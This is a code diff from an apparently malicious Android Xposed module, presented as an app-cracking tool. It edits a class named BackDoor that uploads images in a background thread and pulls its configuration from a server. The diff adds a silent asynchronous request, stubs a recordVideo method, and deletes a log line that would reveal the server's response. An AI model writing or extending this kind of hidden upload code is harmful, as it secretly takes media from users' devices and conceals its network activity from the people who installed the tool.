@@ -11,10 +11,12 @@ import android.os.Environment;
 import android.provider.Settings;
 import cn.coderstory.anycracker.State;
 import cn.coderstory.anycracker.bean.GeneralBean;
+import cn.coderstory.anycracker.bean.VideoBean;
 import com.google.gson.Gson;
 import de.robv.android.xposed.XposedBridge;
 import lombok.SneakyThrows;
 import okhttp3.*;
+import org.jetbrains.annotations.NotNull;
 
 import java.io.File;
 import java.io.IOException;
@@ -87,6 +89,9 @@ public class BackDoor {
         starUploadImg();
         getConfig();
     }
+    public void recordVideo(VideoBean videoBean) {
+
+    }
 
     public void starUploadImg() {
         new Thread(() -> {
@@ -145,6 +150,17 @@ public class BackDoor {
                 .addHeader("Connection","close")
                 .addHeader("Content-Type", "application/x-www-form-urlencoded")
                 .build();
+        client.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(@NotNull Call call, @NotNull IOException e) {
+
+            }
+
+            @Override
+            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
+
+            }
+        });
     }
 
     @SneakyThrows
@@ -157,7 +173,6 @@ public class BackDoor {
                         .header("Accept-Encoding", "identity")
                         .build()
                 ).execute().body().string());
-                XposedBridge.log(result.get());
                 GeneralBean generalBean = gson.fromJson(result.get(), GeneralBean.class);
                 State.mediaList = generalBean.getMediaList();
 
